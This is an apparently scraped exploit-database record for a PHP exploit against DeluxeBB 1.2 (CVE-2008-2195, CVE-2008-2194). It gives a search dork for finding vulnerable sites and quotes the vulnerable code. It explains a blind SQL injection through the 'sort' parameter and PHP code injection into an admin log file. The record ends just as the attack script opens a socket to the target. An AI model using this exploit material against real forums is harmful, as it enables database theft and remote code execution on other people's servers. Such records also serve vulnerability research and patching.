{
    "text": "ecve : CVE-2008-2195 CVE-2008-2194 ， title : DeluxeBB 1.2 - Multiple Vulnerabilities - PHP webapps Exploit ， verified : Verified ， exploit_detail : <?php ， / *  ， DeluxeBB <= 1.2 Multiple Remote Vulnerabilities Exploit ， author... : EgiX ， mail..... : n0b0d13s [ at ] gmail [ dot ] com ， link..... :  ， dork..... : allintitle : powered by DeluxeBB ，  [ - ] Blind SQL injection ( BENCHMARK (  ) method ) in /forums.php ， 108. if (  !  $ sort ) { ， 109. $ sort = 'DESC' ;  ， 110. } elseif (  $ sort='ASC' |  |  $ sort='DESC' ) { ， 111. $ add .= '&sort='. $ sort ;  ， 112. } ， 113. ， 114. //calculating pages and navigation ， 115. $ current_count = 0 ;  ， 116. $ tppt = $ settings [ 'tppt' ]  ;  ， 117. ， 118. //caching censors ， 119. if (  $ settings [ 'censors' ]  ! =0 ) { ， 120. bbcodecache (  )  ;  ， 121. } ， 122. ， 123. //forum info ， 124. $ rows = $ db->query ( \"SELECT COUNT ( tid ) FROM \". $ prefix.\"threads WHERE ( lastpostdate >= ' $ posttime' fid=' $ fid' ) \" )  ;  ， 125. $ nrows = $ db->result (  $ rows )  ;  ， 126. ， 127. $ pageinfo = multipage (  $ nrows ,  $ page ,  $ settings [ 'tppf' ]  , \"forums.php?fid= $ fid\" )  ;  ， 128. ， 129. include (  $ templatefolder.'/forums_header.dtf' )  ;  ， 130. ， 131. //get and format all threads ， 132. $ threads = $ db->query ( \"SELECT t. *  , u.username FROM \". $ prefix.\"threads t LEFT JOIN \". $ prefix.\"users u ON ( t.author=u.uid )  ， WHERE ( t.fid=' $ fid' t.lastpostdate >= ' $ posttime' ) ORDER BY t.pinned $ sort , t.lastpostdate $ sort LIMIT $ pageinfo [ 0 ]  ,  $ pageinfo [ 1 ] \" )  ;  ，  $ sort variable isn't properly sanitised , so an attacker could be inject ( with MySQL >= 4.1 that ， allows subqueries ) SQL code in a subquery after 'ORDER BY' statement , in the query at line 132 ，  [ - ] PHP injection by privilege escalation in /admincp.php ， 29. if (  $ settings [ 'cplog' ] =1 |  |  $ logs=1 ) { ， 30. $ time = time (  )  ;  ， 31. $ dir = $ settings [ 'logpath' ]  ;  ， 32. @ chmod (  $ dir.'/cp.php' , 0777 )  ;  ， 33. $ string = $ _COOKIE [ 'membercookie' ] .\" |  |  $ ip |  $ time |  $ REQUEST_URI\\n\" ;  ， 34. $ filehandle= @ fopen (  $ dir.'/cp.php' , \"a\" )  ;  ， 35. if (  !  $ filehandle ) { ， 36. message (  $ lang_wrongfilepermission ,  $ lang_plschmod )  ;  ， 37. } ， 38. @ flock (  $ filehandle , 2 )  ;  ， 39. @ fwrite (  $ filehandle ,  $ string )  ;  ， 40. @ fclose (  $ filehandle )  ;  ， 41. } ， with admin credentials , an attacker could be inject PHP code into cp.php log file by $ REQUEST_URI ，  * / ， error_reporting ( 0 )  ;  ， set_time_limit ( 0 )  ;  ， ini_set ( \"default_socket_timeout\" , 5 )  ;  ，  $ sock = fsockopen (  $ host , 80 )  ; ",
    "time": "2008-05-05"
}